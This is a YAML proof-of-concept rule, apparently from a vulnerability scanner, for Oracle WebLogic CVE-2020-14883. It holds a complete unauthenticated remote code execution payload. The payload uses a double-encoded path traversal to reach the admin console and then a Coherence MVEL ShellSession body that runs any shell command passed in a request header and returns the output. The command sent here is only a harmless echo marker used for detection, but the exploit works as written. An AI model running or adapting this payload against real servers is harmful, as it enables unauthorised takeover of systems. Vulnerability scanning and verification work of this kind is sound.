name: poc-yaml-weblogic-cve-2020-14883
rules:
  - method: POST
    path: /console/images/%252e%252e%252fconsole.portal
    follow_redirects: false
    headers:
      Test-Header: echo IVX95gVsFySdzTjd9xYaHgR3Kzfu3KuT
      Content-Type: application/x-www-form-urlencoded
    body: >-
      test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("Test-Header");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
    expression:
      response.status == 200 && response.body.bcontains(bytes(string("IVX95gVsFySdzTjd9xYaHgR3Kzfu3KuT")))
detail:
  author: SuperJason(https://github.com/Jason1314Zhang)
  weblogic_version: 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 , 14.1.1.0.0
  links:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883
    - https://paper.seebug.org/1395/